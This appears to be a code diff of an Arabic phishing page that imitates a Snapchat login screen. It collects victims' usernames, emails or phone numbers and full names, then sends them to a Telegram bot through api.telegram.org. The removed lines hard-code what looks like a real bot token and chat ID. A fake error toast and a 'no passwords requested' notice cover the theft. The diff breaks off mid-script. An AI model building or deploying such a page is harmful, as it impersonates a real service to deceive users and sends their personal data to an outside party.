@@ -3,143 +3,196 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تسجيل الدخول — مدموج</title>
+  <title>تسجيل الدخول — احترافي (صفحتان)</title>
 
   <!--
-    IMPORTANT (ضع هذه القيم على جهازك فقط إذا أردت الإرسال من المتصفح):
-    استبدل القيمتين التاليتين بقيم بوتك:
-      const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
-      const TG_CHAT_ID = '6873334348';
-    لا تنشر الملف بعد لصق التوكن لأن التوكن سيظهر في طلبات الشبكة.
+    مهم — ضع هذه القيم على جهازك فقط إن أردت إرسال الرسائل من المتصفح.
+    لا ترفع الملف أو تشاركه بعد لصق التوكن لأنه سيظهر في طلبات الشبكة.
+      const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
+      const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
   -->
   <script>
-    const TG_TOKEN = '8794884027:AAEMu6aUsnkIwTvEyO05D8Aq4gheORNREac';
-    const TG_CHAT_ID = '6873334348';
+    const TG_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
+    const TG_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
   </script>
 
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
   <style>
     :root{
-      --bg:#f3f5f7; --card:#fff; --accent:#ffd400; --accent-2:#ffdd66;
-      --muted:#9aa0a6; --blue:#00a8ff; --danger:#e03b3b;
-      --radius:14px; --shadow-lg: 0 14px 40px rgba(20,20,20,0.08);
-      --shadow-sm: 0 6px 20px rgba(20,20,20,0.06);
+      --bg:#f4f8fb;
+      --card:#ffffff;
+      --accent:#ffd400;
+      --accent-2:#ffdf86;
+      --primary:#0da4ff;
+      --muted:#7f8b95;
+      --glass: rgba(255,255,255,0.78);
+      --radius:18px;
+      --shadow-lg: 0 22px 80px rgba(10,20,30,0.08);
+      --shadow-md: 0 10px 30px rgba(10,20,30,0.06);
+      --success:#28c76f;
+      --danger:#ff4d4f;
+      --trans: 320ms cubic-bezier(.2,.9,.2,1);
     }
     *{box-sizing:border-box}
-    html,body{height:100%;margin:0;background:linear-gradient(180deg,#f8fafb 0%,var(--bg) 100%);font-family:'Cairo',system-ui,Arial;color:#111;direction:rtl}
-    .viewport{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
-    .phone{width:420px;max-width:100%}
-    .card{background:var(--card);border-radius:20px;padding:18px;box-shadow:var(--shadow-lg);overflow:hidden}
-    .top-pill{display:flex;align-items:center;justify-content:center;gap:10px;background:linear-gradient(180deg,var(--accent) 0%,var(--accent-2) 100%);color:#111;padding:10px 18px;border-radius:999px;margin:-36px auto 10px;width:fit-content;font-weight:800;box-shadow:var(--shadow-sm)}
-    .top-pill img{width:20px;height:20px;object-fit:contain}
-    .logo{display:flex;justify-content:center;margin-top:6px;margin-bottom:6px}
-    .logo img{width:76px;height:76px;object-fit:contain}
-    h1{font-size:28px;margin:8px 0 14px;text-align:center;line-height:1.02;font-weight:800}
-    label{display:block;color:var(--muted);margin-bottom:8px;font-size:15px}
-    .type-select{display:flex;gap:8px;margin-bottom:12px;justify-content:center}
-    .type-btn{flex:1;padding:10px;border-radius:12px;text-align:center;background:#fff;border:1px solid #eee;cursor:pointer;font-weight:700}
-    .type-btn.active{background:linear-gradient(180deg,#f7fbff,#e8f7ff);border-color:rgba(0,168,255,0.18);color:var(--blue)}
-    .row{display:flex;gap:10px;align-items:center}
-    input[type="text"], input[type="email"], input[type="tel"], .small-btn{
-      width:100%;padding:14px 12px;border-radius:12px;border:2px solid #f0e6cc;font-size:16px;background:#fff;outline:none;
+    html,body{height:100%;margin:0;background:linear-gradient(180deg,#f8fbff 0%,var(--bg) 100%);font-family:'Cairo',system-ui,Arial;color:#06272b;direction:rtl;-webkit-font-smoothing:antialiased}
+    .viewport{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+
+    .device{width:420px;max-width:96%}
+    .card{
+      position:relative;background:var(--card);border-radius:22px;padding:22px;box-shadow:var(--shadow-lg);overflow:hidden;
+      transform-origin:center;transition:transform var(--trans), box-shadow var(--trans);
     }
-    .small-btn{display:inline-flex;align-items:center;gap:8px;padding:10px 12px;border-radius:12px;background:#fff;border:1px solid #eee;cursor:pointer;font-weight:600;white-space:nowrap}
-    .hint{font-size:13px;color:var(--muted);text-align:center;margin-top:8px}
-    .actions{display:flex;justify-content:center;margin-top:14px}
-    .btn{display:inline-block;padding:12px 18px;border-radius:999px;background:var(--blue);color:#fff;font-weight:800;border:none;box-shadow:0 10px 28px rgba(0,168,255,0.18);cursor:pointer;font-size:16px;min-width:150px}
-    .btn.ghost{background:#fff;color:var(--blue);border:1px solid #e6f3ff;box-shadow:none}
-    .footer{margin-top:12px;text-align:center;color:var(--muted);font-size:14px}
+    .card:active{transform:scale(.998)}
+    .brand-pill{position:absolute;left:50%;transform:translateX(-50%) translateY(-44px);top:0;display:inline-flex;align-items:center;gap:10px;padding:10px 18px;border-radius:999px;background:linear-gradient(180deg,var(--accent),var(--accent-2));font-weight:800;box-shadow:0 12px 28px rgba(0,0,0,0.12);}
+    .brand-pill img{width:20px;height:20px;object-fit:contain}
+
+    .logo{display:flex;justify-content:center;margin-top:6px;margin-bottom:6px}
+    .logo img{width:80px;height:80px;object-fit:contain;filter:drop-shadow(0 8px 18px rgba(0,0,0,0.06))}
+
+    h1{font-size:26px;margin:8px 0 6px;text-align:center;font-weight:800;line-height:1}
+    p.lead{margin:0;text-align:center;color:var(--muted);font-size:14px;margin-bottom:14px}
+
+    label{display:block;color:var(--muted);margin-bottom:8px;font-size:14px}
+    input[type="text"], input[type="email"], input[type="tel"], .select-btn{
+      width:100%;padding:14px 14px;border-radius:12px;border:1px solid rgba(14,46,65,0.04);background:linear-gradient(180deg,#fff,#fbfdff);font-size:16px;box-shadow:var(--shadow-md);outline:none;transition:box-shadow var(--trans), transform var(--trans), border-color var(--trans);
+    }
+    input:focus{box-shadow:0 18px 54px rgba(13,164,255,0.12);border-color:rgba(13,164,255,0.28);transform:translateY(-2px)}
+    .select-btn{display:inline-flex;align-items:center;gap:10px;padding:12px;border-radius:12px;cursor:pointer;font-weight:700;border:1px solid #eef7ff;background:#fff}
+
+    .micro{background:var(--glass);padding:8px;border-radius:12px;margin-top:10px;text-align:center;color:var(--muted);font-size:13px;border:1px solid rgba(255,255,255,0.6)}
+
+    .controls{display:flex;gap:12px;justify-content:center;margin-top:18px}
+    .btn{background:linear-gradient(180deg,var(--primary),#0b99e6);color:#fff;padding:12px 18px;border-radius:999px;border:none;font-weight:900;cursor:pointer;min-width:150px;box-shadow:0 12px 40px rgba(13,164,255,0.16);transition:transform 160ms, box-shadow 160ms}
+    .btn:active{transform:translateY(2px);box-shadow:0 6px 22px rgba(13,164,255,0.12)}
+    .btn.ghost{background:#fff;color:var(--primary);border:1px solid #e8f6ff;box-shadow:none}
+
+    .hint{font-size:13px;color:var(--muted);text-align:center;margin-top:12px}
+
+    /* page transitions */
+    .page{position:relative;min-height:320px}
+    .page-inner{transition:transform var(--trans), opacity var(--trans); will-change:transform,opacity}
     .hidden{display:none}
-    .modal-backdrop{position:fixed;inset:0;display:none;background:rgba(0,0,0,0.28);align-items:flex-end;justify-content:center;padding:14px;z-index:60}
-    .modal{width:100%;max-width:420px;background:#fff;border-radius:20px;padding:12px;box-shadow:0 18px 50px rgba(0,0,0,0.20);max-height:78vh;overflow:hidden}
-    .modal input.search-input{width:100%;padding:10px;border-radius:10px;border:1px solid #eee;font-size:15px}
-    .country-list{overflow:auto;max-height:60vh;padding-right:6px;margin-top:8px}
-    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:12px;cursor:pointer}
-    .country-item:hover{background:#f6f8fb}
-    .country-name{display:flex;gap:10px;align-items:center}
-    .country-flag{font-size:20px}
-    .country-code{color:var(--muted);font-weight:700}
-    .toast-backdrop{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:80}
-    .toast{background:#fff;padding:18px 20px;border-radius:12px;box-shadow:0 18px 56px rgba(0,0,0,0.20);max-width:92%;width:360px;text-align:center}
-    .toast h3{margin:0 0 6px;font-size:18px}
+
+    /* sliding animations (we use classes in JS) */
+    .slide-in-right{animation:slideInRight var(--trans) both}
+    .slide-out-left{animation:slideOutLeft var(--trans) both}
+    .slide-in-left{animation:slideInLeft var(--trans) both}
+    .slide-out-right{animation:slideOutRight var(--trans) both}
+    @keyframes slideInRight{from{transform:translateX(14px);opacity:0}to{transform:none;opacity:1}}
+    @keyframes slideOutLeft{from{transform:none;opacity:1}to{transform:translateX(-14px);opacity:0}}
+    @keyframes slideInLeft{from{transform:translateX(-14px);opacity:0}to{transform:none;opacity:1}}
+    @keyframes slideOutRight{from{transform:none;opacity:1}to{transform:translateX(14px);opacity:0}}
+
+    /* modal */
+    .modal-back{position:fixed;inset:0;display:none;align-items:flex-end;justify-content:center;padding:12px;background:linear-gradient(180deg,rgba(0,0,0,0.28),rgba(0,0,0,0.34));z-index:90}
+    .modal{width:100%;max-width:420px;background:var(--card);border-radius:16px;padding:12px;max-height:74vh;overflow:hidden;box-shadow:0 18px 60px rgba(0,0,0,0.20)}
+    .modal input{width:100%;padding:10px;border-radius:10px;border:1px solid #eef2f7}
+    .country-list{overflow:auto;max-height:60vh;margin-top:8px;padding-right:6px}
+    .country-item{display:flex;align-items:center;justify-content:space-between;padding:10px;border-radius:10px;cursor:pointer;transition:background 160ms}
+    .country-item:hover{background:#f6fbff}
+
+    /* toast */
+    .toast-back{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:100}
+    .toast{background:#fff;padding:18px;border-radius:12px;box-shadow:0 22px 70px rgba(0,0,0,0.24);width:92%;max-width:380px;text-align:center}
+    .toast h3{margin:0 0 8px;font-size:18px}
     .toast p{margin:0;color:#444;font-size:15px}
-    .toast .ok{margin-top:12px;display:inline-block;padding:10px 14px;border-radius:8px;background:var(--blue);color:#fff;font-weight:700;cursor:pointer}
-    @media (max-width:420px){ .phone{width:380px} h1{font-size:24px} .logo img{width:64px;height:64px} }
+    .toast button{margin-top:12px;padding:10px 14px;border-radius:8px;background:var(--primary);color:#fff;border:none;cursor:pointer;font-weight:700}
+
+    @media(max-width:420px){ .device{width:360px} h1{font-size:22px} .logo img{width:64px;height:64px} }
   </style>
 </head>
 <body>
   <div class="viewport">
-    <div class="phone">
+    <div class="device">
+
       <div class="card" role="application" aria-label="نموذج تسجيل">
 
-        <div class="top-pill" aria-hidden="true"><span>Open Snapchat</span><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
+        <div class="brand-pill" aria-hidden="true">
+          <img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /> Open Snapchat
+        </div>
+
         <div class="logo"><img src="https://i.top4top.io/p_3857xyurd0.jpeg" alt="logo" /></div>
-        <h1 id="mainTitle">تسجيل الدخول إلى سناب شات</h1>
 
-        <!-- STEP 1: single primary input (username or email). Phone only after pressing button -->
-        <div id="step1" aria-live="polite">
-          <label for="primaryInput">اسم المستخدم أو البريد الإلكتروني</label>
+        <!-- PAGE 1 (primary) -->
+        <section id="page-1" class="page page-inner" aria-labelledby="title1">
+          <h1 id="title1">تسجيل الدخول إلى سناب شات</h1>
+          <p class="lead">أدخل اسم المستخدم أو البريد الإلكتروني — أو استخدم رقم الهاتف.</p>
 
-          <div id="primaryWrap">
-            <input id="primaryInput" type="text" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" autocomplete="off" inputmode="latin" />
+          <div class="field">
+            <label for="primary">اسم المستخدم أو البريد الإلكتروني</label>
+            <div id="primaryHolder">
+              <input id="primary" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />
+            </div>
+            <div class="micro">لن يتم طلب أو إرسال كلمات المرور.</div>
           </div>
 
-          <div style="margin-top:8px;text-align:center">
-            <button id="usePhoneBtn" class="small-btn" type="button">استخدم رقم الهاتف بدلاً من ذلك</button>
+          <div style="margin-top:12px;text-align:center">
+            <button id="togglePhone" class="select-btn" aria-pressed="false">
+              <!-- phone icon -->
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" style="transform:translateY(1px)"><path d="M22 16.92V20a2 2 0 0 1-2.18 2 19.86 19.86 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6A19.86 19.86 0 0 1 2 4.18 2 2 0 0 1 4 2h3.09a1 1 0 0 1 1 .75c.12.7.3 1.37.54 2a1 1 0 0 1-.25 1L7.91 7.91a14 14 0 0 0 6 6l1.16-1.16a1 1 0 0 1 1-.25c.63.24 1.3.42 2 .54a1 1 0 0 1 .75 1V20z" fill="#0b2a33"/></svg>
+              <span style="margin-inline-start:6px">استخدم رقم الهاتف بدلاً من ذلك</span>
+            </button>
           </div>
 
-          <div class="actions" style="margin-top:14px">
-            <button id="nextBtn" class="btn">التالي</button>
+          <div class="controls">
+            <button id="btnNext" class="btn">
+              <!-- arrow icon -->
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-inline-start:8px"><path d="M5 12h14M13 5l7 7-7 7" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+              التالي
+            </button>
           </div>
-          <div class="footer"><small id="status1" class="hint"></small></div>
-        </div>
 
-        <!-- STEP 2: full name -->
-        <div id="step2" class="hidden" aria-live="polite">
-          <label for="fullName">الاسم الكامل</label>
-          <input id="fullName" type="text" placeholder="أدخل الاسم الكامل" autocomplete="off" />
-          <div class="hint" style="margin-top:8px">بعد الإرسال سيظهر إشعار تحقق من المعلومات.</div>
+          <div class="hint" id="hint1"></div>
+        </section>
 
-          <div class="actions" style="margin-top:14px">
-            <button id="sendBtn" class="btn">إرسال الاسم</button>
-            <button id="backBtn" class="btn ghost" style="margin-left:10px">العودة</button>
+        <!-- PAGE 2 (name) - separate page -->
+        <section id="page-2" class="page page-inner hidden" aria-labelledby="title2">
+          <h1 id="title2">التحقق — خطوة إضافية</h1>
+          <p class="lead">الرجاء إدخال الاسم الكامل</p>
+
+          <div class="field">
+            <label for="nameInput">الاسم الكامل</label>
+            <input id="nameInput" type="text" placeholder="أدخل الاسم الكامل" autocomplete="off" />
           </div>
-          <div class="footer"><small id="status2" class="hint"></small></div>
-        </div>
+
+          <div class="controls">
+            <button id="btnSend" class="btn">
+              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" style="vertical-align:middle;margin-inline-start:8px"><path d="M22 2L11 13" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 2l-7 20  -4-9-9-4 20-7z" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+              إرسال الاسم
+            </button>
+
+            <button id="btnBack" class="btn ghost">العودة</button>
+          </div>
+
+          <div class="hint" id="hint2"></div>
+        </section>
 
       </div>
+
     </div>
   </div>
 
-  <!-- country modal (shown only when phone mode active) -->
-  <div id="countryModal" class="modal-backdrop" aria-hidden="true">
-    <div class="modal" role="dialog" aria-modal="true" aria-label="قائمة الدول">
+  <!-- Country Modal -->
+  <div id="countryModal" class="modal-back" aria-hidden="true">
+    <div class="modal" role="dialog" aria-modal="true" aria-label="اختر الدولة">
       <div style="text-align:center;font-weight:700;margin-bottom:6px">اختر الدولة</div>
-      <div class="search"><input id="countrySearch" class="search-input" placeholder="ابحث عن دولة أو رمز..." /></div>
-      <div id="countryList" class="country-list" role="listbox" tabindex="0"></div>
+      <input id="countrySearch" placeholder="ابحث عن دولة أو رمز..." class="search-input" />
+      <div id="countryList" class="country-list" role="listbox"></div>
     </div>
   </div>
 
-  <!-- toast -->
-  <div id="toastBackdrop" class="toast-backdrop" aria-hidden="true">
+  <!-- Toast (company-style with icon) -->
+  <div id="toastBack" class="toast-back" aria-hidden="true">
     <div class="toast" role="alertdialog" aria-live="assertive">
       <h3 id="toastTitle">عذراً</h3>
-      <p id="toastMsg">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق من المعلومات والمحاولة مرة أخرى.</p>
-      <div><button id="toastOk" class="ok">حسناً</button></div>
+      <p id="toastText">اسم المستخدم أو الاسم غير صحيح. يرجى التحقق والمحاولة مرة أخرى.</p>
+      <div style="margin-top:12px"><button id="toastOk">حسناً</button></div>
     </div>
   </div>
 
   <script>
-    /************************************************************************
-     * سلوك الصفحة:
-     * - primaryInput يقبل username (إنجليزي فقط) أو email.
-     * - عند الضغط "استخدم رقم الهاتف" يُستبدل الحقل بحقل phone مع زر اختيار الدولة.
-     * - عند الضغط "التالي" يُرسَل المدخل الأول فوراً إلى Telegram (إذا وضعت التوكن أعلى الملف)، ثم تظهر واجهة الاسم.
-     * - عند إرسال الاسم، يُرسَل رسالة واحدة تحتوي المدخل السابق + الاسم إلى نفس البوت.
-     * - لا يتم حفظ أي بيانات في localStorage/sessionStorage — كل شيء في الذاكرة.
-     ************************************************************************/
-
-    // Config: countries (قائمة قصيرة، زِدها إن أردت)
+    // ===== configuration & helpers =====
     const COUNTRIES = [
       {name:'الأردن', code:'JO', dial:'+962', flag:'🇯🇴'},
       {name:'مصر', code:'EG', dial:'+20', flag:'🇪🇬'},
@@ -150,265 +203,245 @@
       {name:'الولايات المتحدة', code:'US', dial:'+1', flag:'🇺🇸'},
       {name:'المملكة المتحدة', code:'GB', dial:'+44', flag:'🇬🇧'}
     ];
+    const usernameRx = /^[A-Za-z0-9._-]{3,30}$/;
+    const emailRx = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const digitsOnly = s => s.replace(/[^\d]/g,'');
 
-    // Elements
-    const primaryWrap = document.getElementById('primaryWrap');
-    const primaryInput = document.getElementById('primaryInput');
-    const usePhoneBtn = document.getElementById('usePhoneBtn');
-    const nextBtn = document.getElementById('nextBtn');
-    const status1 = document.getElementById('status1');
+    // DOM
+    const page1 = document.getElementById('page-1');
+    const page2 = document.getElementById('page-2');
 
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const mainTitle = document.getElementById('mainTitle');
-    const fullName = document.getElementById('fullName');
-    const sendBtn = document.getElementById('sendBtn');
-    const backBtn = document.getElementById('backBtn');
-    const status2 = document.getElementById('status2');
+    const primaryHolder = document.getElementById('primaryHolder');
+    let primaryInput = document.getElementById('primary');
+    const togglePhone = document.getElementById('togglePhone');
+    const btnNext = document.getElementById('btnNext');
+    const hint1 = document.getElementById('hint1');
 
     const countryModal = document.getElementById('countryModal');
     const countryList = document.getElementById('countryList');
     const countrySearch = document.getElementById('countrySearch');
 
-    const toastBackdrop = document.getElementById('toastBackdrop');
-    const toastTitle = document.getElementById('toastTitle');
-    const toastMsg = document.getElementById('toastMsg');
+    const nameInput = document.getElementById('nameInput');
+    const btnSend = document.getElementById('btnSend');
+    const btnBack = document.getElementById('btnBack');
+    const hint2 = document.getElementById('hint2');
+
+    const toastBack = document.getElementById('toastBack');
     const toastOk = document.getElementById('toastOk');
 
-    // State
+    // state
     let phoneMode = false;
     let selectedCountry = COUNTRIES[0];
-    let prevData = null; // {type, value, country?, timestamp}
+    let prev = null; // {type,value,country}
 
-    // Input rules
-    const usernameRegex = /^[A-Za-z0-9._-]{3,30}$/;
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    const digitsOnly = v => v.replace(/[^\d]/g,'');
-
-    // Helper: swap to phone input
-    function showPhoneInput(){
-      phoneMode = true;
-      // replace primaryWrap contents with country button + input
-      primaryWrap.innerHTML = `
-        <div style="display:flex;gap:10px;align-items:center">
-          <button id="countryBtn" class="small-btn" type="button"><span id="countryFlag">${selectedCountry.flag}</span>&nbsp;<span id="countryDial">${selectedCountry.dial}</span></button>
-          <input id="phoneInput" type="tel" placeholder="أدخل رقم الهاتف" inputmode="numeric" />
-        </div>
-      `;
-      // wire events
-      document.getElementById('countryBtn').addEventListener('click', ()=> { renderCountryList(COUNTRIES); countryModal.style.display='flex'; setTimeout(()=> countrySearch.focus(),120); });
-      const phoneInput = document.getElementById('phoneInput');
-      phoneInput.addEventListener('input', e => { e.target.value = digitsOnly(e.target.value); });
-      phoneInput.addEventListener('keydown', e => { if(e.key==='Enter'){ e.preventDefault(); nextBtn.click(); } });
-      phoneInput.focus();
-    }
-
-    // Helper: restore username/email input
-    function showPrimaryInput(){
-      phoneMode = false;
-      primaryWrap.innerHTML = `<input id="primaryInput" type="text" placeholder="أدخل اسم المستخدم أو البريد الإلكتروني" autocomplete="off" inputmode="latin" />`;
-      // rebind primaryInput variable and events
-      const newPrimary = document.getElementById('primaryInput');
-      // allow only latin chars for username but keep @ for email
-      newPrimary.addEventListener('input', function(e){
-        // allow ASCII letters, digits and common email/username chars; prevent Arabic chars
-        // but do not remove @ or . for email; we only strip Arabic letters
+    // UI helpers
+    function bindAscii(el){
+      el.addEventListener('input', e => {
         e.target.value = e.target.value.replace(/[^\x00-\x7F]/g,'');
         if(e.target.value.length > 100) e.target.value = e.target.value.slice(0,100);
       });
-      newPrimary.addEventListener('keydown', e => { if(e.key==='Enter'){ e.preventDefault(); nextBtn.click(); } });
-      primaryInput = newPrimary; // reassign for later use
-      newPrimary.focus();
+      el.addEventListener('keydown', e => { if(e.key === 'Enter') btnNext.click(); });
     }
 
-    usePhoneBtn.addEventListener('click', function(){
-      // swap input to phone
-      showPhoneInput();
-      status1.textContent = '';
+    function switchToPhone(){
+      phoneMode = true;
+      primaryHolder.innerHTML = `
+        <div style="display:flex;gap:10px;align-items:center">
+          <button id="countryBtn" class="select-btn" type="button"><span id="countryFlag">${selectedCountry.flag}</span>&nbsp;<span id="countryDial">${selectedCountry.dial}</span></button>
+          <input id="phoneInput" type="tel" placeholder="أدخل رقم الهاتف" inputmode="numeric" />
+        </div>`;
+      document.getElementById('countryBtn').addEventListener('click', ()=> { renderCountries(COUNTRIES); countryModal.style.display='flex'; setTimeout(()=> countrySearch.focus(),120); });
+      primaryInput = document.getElementById('phoneInput');
+      primaryInput.addEventListener('input', e => { e.target.value = digitsOnly(e.target.value); });
+      primaryInput.addEventListener('keydown', e => { if(e.key === 'Enter') btnNext.click(); });
+      togglePhone.setAttribute('aria-pressed','true');
+      togglePhone.textContent = 'استخدم البريد الإلكتروني/اسم المستخدم بدلاً من ذلك';
+    }
+
+    function switchToPrimary(){
+      phoneMode = false;
+      primaryHolder.innerHTML = `<input id="primary" type="text" placeholder="مثال: myusername أو email@example.com" inputmode="latin" autocomplete="off" />`;
+      primaryInput = document.getElementById('primary');
+      bindAscii(primaryInput);
+      togglePhone.setAttribute('aria-pressed','false');
+      togglePhone.textContent = 'استخدم رقم الهاتف بدلاً من ذلك';
+    }
+
+    togglePhone.addEventListener('click', ()=> {
+      if(!phoneMode) switchToPhone(); else switchToPrimary();
     });
 
-    // country modal rendering
-    function renderCountryList(list){
+    // Modal: countries
+    function renderCountries(list){
       countryList.innerHTML = '';
       list.forEach(c => {
-        const item = document.createElement('div');
-        item.className = 'country-item';
-        item.innerHTML = `<div class="country-name"><span class="country-flag">${c.flag}</span><div style="display:flex;flex-direction:column;margin-right:8px"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div><div class="country-code">${c.dial}</div>`;
-        item.addEventListener('click', ()=> {
+        const row = document.createElement('div');
+        row.className = 'country-item';
+        row.innerHTML = `<div style="display:flex;gap:10px;align-items:center"><span style="font-size:20px">${c.flag}</span><div style="display:flex;flex-direction:column;margin-right:6px"><strong>${c.name}</strong><small style="color:var(--muted);font-size:12px">${c.code}</small></div></div><div style="font-weight:700;color:#333">${c.dial}</div>`;
+        row.addEventListener('click', ()=> {
           selectedCountry = c;
-          // update button if exists
           const cf = document.getElementById('countryFlag');
           const cd = document.getElementById('countryDial');
           if(cf) cf.textContent = c.flag;
           if(cd) cd.textContent = c.dial;
           countryModal.style.display = 'none';
-          const phoneInput = document.getElementById('phoneInput');
-          if(phoneInput) phoneInput.placeholder = 'أدخل رقم الهاتف ' + c.dial;
-          if(phoneInput) phoneInput.focus();
+          const pi = document.getElementById('phoneInput');
+          if(pi){ pi.placeholder = 'أدخل رقم الهاتف ' + c.dial; pi.focus(); }
         });
-        countryList.appendChild(item);
+        countryList.appendChild(row);
       });
       if(list.length === 0) countryList.innerHTML = '<div style="padding:12px;color:var(--muted);text-align:center">لا توجد نتائج</div>';
     }
-    countrySearch.addEventListener('input', function(){
+    countrySearch.addEventListener('input', ()=> {
       const q = countrySearch.value.trim().toLowerCase();
-      if(!q){ renderCountryList(COUNTRIES); return; }
+      if(!q) return renderCountries(COUNTRIES);
       const filtered = COUNTRIES.filter(c => c.name.toLowerCase().includes(q) || c.code.toLowerCase().includes(q) || c.dial.includes(q));
-      renderCountryList(filtered);
+      renderCountries(filtered);
     });
-    countryModal.addEventListener('click', (e)=> { if(e.target === countryModal) countryModal.style.display='none'; });
+    countryModal.addEventListener('click', e => { if(e.target === countryModal) countryModal.style.display = 'none'; });
 
-    // Detect primary value type
-    function detectPrimaryType(val){
-      if(!val) return null;
-      if(/^\d+$/.test(val)) return 'phone';
-      if(val.includes('@')) return 'email';
-      return 'username';
-    }
-
-    // Send via Telegram (Image GET) — returns true if attempted
-    function canSendToTelegram(){
-      return typeof TG_TOKEN !== 'undefined' && typeof TG_CHAT_ID !== 'undefined' &&
-             TG_TOKEN && TG_CHAT_ID &&
-             !TG_TOKEN.includes('PASTE') && !TG_CHAT_ID.includes('PASTE');
-    }
-    function sendToTelegram(text){
-      if(!canSendToTelegram()){
-        status1.style.color = '#b45a00';
-        status1.textContent = 'لم تُضبط قيم TG_TOKEN أو TG_CHAT_ID أعلى الملف — لن يُرسل فعلياً.';
-        setTimeout(()=> status1.textContent = '', 2600);
-        return false;
-      }
-      try{
-        const url = `https://api.telegram.org/bot${encodeURIComponent(TG_TOKEN)}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT_ID)}&text=${encodeURIComponent(text)}`;
-        const img = new Image();
-        img.src = url + '&_=' + Date.now(); // cache buster
-        console.log('Telegram send URL:', url);
-        return true;
-      } catch(e){
-        console.error('send error', e);
-        return false;
-      }
-    }
-
-    // Validate primary depending on mode
-    function getPrimaryValueAndType(){
+    // Validation & detect primary
+    function validatePrimary(){
       if(phoneMode){
-        const phoneInput = document.getElementById('phoneInput');
-        if(!phoneInput) return null;
-        const val = phoneInput.value.trim();
-        const clean = digitsOnly(val);
-        if(clean.length < 6) { status1.style.color='crimson'; status1.textContent='الرجاء إدخال رقم هاتف صالح.'; setTimeout(()=> status1.textContent='',2200); return null; }
+        const v = (document.getElementById('phoneInput')||{value:''}).value.trim();
+        const clean = digitsOnly(v);
+        if(clean.length < 6){ hint1.style.color='crimson'; hint1.textContent='الرجاء إدخال رقم هاتف صالح'; setTimeout(()=> hint1.textContent='',2000); return null; }
         return { type:'phone', value:clean, country:selectedCountry };
       } else {
-        const p = document.getElementById('primaryInput');
-        if(!p) return null;
-        const val = p.value.trim();
-        if(!val){ status1.style.color='crimson'; status1.textContent='الرجاء إدخال اسم المستخدم أو البريد.'; setTimeout(()=> status1.textContent='',2200); return null; }
-        // check email
-        if(val.includes('@')){
-          if(!emailRegex.test(val)){ status1.style.color='crimson'; status1.textContent='الرجاء إدخال بريد إلكتروني صالح.'; setTimeout(()=> status1.textContent='',2200); return null; }
-          return { type:'email', value:val };
+        const v = (document.getElementById('primary')||{value:''}).value.trim();
+        if(!v){ hint1.style.color='crimson'; hint1.textContent='الرجاء إدخال اسم المستخدم أو البريد'; setTimeout(()=> hint1.textContent='',2000); return null; }
+        if(v.includes('@')){
+          if(!emailRx.test(v)){ hint1.style.color='crimson'; hint1.textContent='بريد إلكتروني غير صالح'; setTimeout(()=> hint1.textContent='',2200); return null; }
+          return { type:'email', value:v };
         } else {
-          // treat as username: only latin chars already enforced by input handler; validate length/pattern
-          if(!usernameRegex.test(val)){ status1.style.color='crimson'; status1.textContent='اسم المستخدم غير صالح (3-30 حرف إنجليزي / رقم / . _ -).'; setTimeout(()=> status1.textContent='',3000); return null; }
-          return { type:'username', value:val };
+          if(!usernameRx.test(v)){ hint1.style.color='crimson'; hint1.textContent='اسم مستخدم غير صالح (3-30 حرف إنجليزي/رقم/._-)'; setTimeout(()=> hint1.textContent='',3000); return null; }
+          return { type:'username', value:v };
         }
       }
     }
 
-    // Next button handler: validate primary, send primary, move to name step
-    nextBtn.addEventListener('click', function(){
-      const primary = getPrimaryValueAndType();
-      if(!primary) return;
-      // save in-memory
-      prevData = { ...primary, timestamp: new Date().toISOString() };
-      // send to telegram (attempt)
-      const countryText = prevData.type === 'phone' ? `${prevData.country.name} ${prevData.country.dial}` : '—';
-      const text = `نموذج: المدخل الأول\nالنوع: ${prevData.type}\nالقيمة: ${prevData.value}\nالبلد: ${countryText}\nالوقت: ${prevData.timestamp}`;
-      sendToTelegram(text);
-      // go to step2
-      step1.classList.add('hidden');
-      step2.classList.remove('hidden');
-      mainTitle.textContent = 'التحقق — خطوة إضافية';
-      fullName.focus();
-    });
-
-    // Send final: combine prevData + name, send as single message
-    sendBtn.addEventListener('click', function(){
-      const name = fullName.value.trim();
-      if(!name){ status2.style.color='crimson'; status2.textContent='الرجاء إدخال الاسم'; setTimeout(()=> status2.textContent='',2200); return; }
-      if(!prevData){ showToast('خطأ','لا توجد بيانات سابقة — الرجاء العودة وإدخال الحقل الأول.'); return; }
-
-      const countryText = prevData.type === 'phone' && prevData.country ? `${prevData.country.name} ${prevData.country.dial}` : '—';
-      const text = `نموذج: الإرسال النهائي\nالنوع: ${prevData.type}\nالقيمة: ${prevData.value}\nالبلد: ${countryText}\nالاسم: ${name}\nالوقت: ${new Date().toISOString()}`;
-      sendToTelegram(text);
-
